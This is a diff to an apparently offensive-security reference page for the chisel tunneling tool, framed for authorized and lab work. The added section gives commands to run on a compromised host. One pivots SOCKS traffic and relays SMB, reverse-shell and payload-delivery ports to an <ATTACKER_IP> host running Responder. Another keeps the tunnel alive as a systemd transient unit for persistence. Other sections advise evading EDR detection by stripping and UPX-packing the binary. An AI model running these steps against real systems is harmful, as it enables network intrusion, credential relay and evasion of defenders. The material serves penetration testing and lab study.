@@ -5,7 +5,7 @@ description: "Auth/lab ref: HTTP-based TCP/UDP tunneling tool for port forwardin
 
 # chisel
 
-**Goal**: Establish reverse and forward TCP/UDP tunnels using HTTP over WebSockets. Ideal for environments where SSH/TUN is unavailable, blocked, or where root privileges (needed for Ligolo-ng) are missing.
+**Goal**: Establish reverse and forward TCP/UDP tunnels using HTTP over WebSockets. Ideal for environments where SSH/TUN is unavailable or blocked.
 
 ## Cognitive Stance
 
@@ -45,12 +45,31 @@ The attacker wants to reach a specific internal service (e.g., an RDP server at 
 - **Authentication**: Prevent Blue Teams or scanners from hijacking your Chisel C2:
   - Add `--auth user:password` to both client and server executions.
 
-## 3. Strict Quality Gates
+## 3. Multi-forward pattern (SOCKS + port relays in one tunnel)
 
-- **TCP Meltdown**: Avoid running intense TCP scans (like `nmap -sT -T4`) over SOCKS. Chisel multiplexes TCP over TCP, which causes performance collapse ("TCP Meltdown") due to conflicting re-transmission timers. Slow down the scans or strictly use Ligolo-ng if high-bandwidth stability is required.
+Combine reverse SOCKS with multiple local port forwards in a single client invocation — avoids spawning multiple chisel processes:
+```bash
+# Compromised host: SOCKS + relay SMB/reverse-shell/HTTP through the tunnel
+./chisel client <ATTACKER_IP>:8000 \
+  R:socks \
+  0.0.0.0:445:<ATTACKER_IP>:445 \
+  0.0.0.0:4445:<ATTACKER_IP>:4445 \
+  0.0.0.0:80:<ATTACKER_IP>:8099
+```
+This gives the attacker: SOCKS5 at `127.0.0.1:1080` into the internal net; box:445 → attacker Responder (NTLM coercion relay); box:4445 → attacker listener (reverse shells from internal hosts); box:80 → attacker HTTP server (payload delivery to internal hosts that can only reach the box).
+
+**Persistence on systemd targets**: when the compromised host runs systemd and you have root, launch chisel as a transient unit — survives shell deaths and cgroup kills (e.g. stopping a crashed service that spawned your shell):
+```bash
+sudo systemd-run --unit=pivot-chisel --collect \
+  /tmp/chisel client <ATTACKER_IP>:8000 R:socks 0.0.0.0:445:<ATTACKER_IP>:445
+```
+
+## 4. Strict Quality Gates
+
+- **TCP Meltdown**: Avoid running intense TCP scans (like `nmap -sT -T4`) over SOCKS. Chisel multiplexes TCP over TCP, which causes performance collapse ("TCP Meltdown") due to conflicting re-transmission timers. Slow down scans and keep concurrency low.
 - **OPSEC**: Modern EDRs aggressively flag the default `chisel` filename and common command-line arguments (`R:socks`). Compile from source using `-ldflags="-s -w"` to strip symbols and use UPX packing, or pass the connection string via environment variables if supported.
 
-## 4. Short-lived reverse tunnel — diagnose the ingress path first
+## 5. Short-lived reverse tunnel — diagnose the ingress path first
 
 A reverse session that binds (`proxy#R:... Listening` / `Bound proxies`) then drops after a few seconds (`SSH disconnected`) is usually the **ingress path** — most often the **target/lab network resetting the back-connection** to your operator IP (HTB/OpenVPN labs commonly do this) — not chisel, and usually not your own local layer (NAT, port-forward proxy, Docker/WSL published port, cloud SNAT). The kill is path-specific, so localize it before blaming your tunnel or host runtime.
 
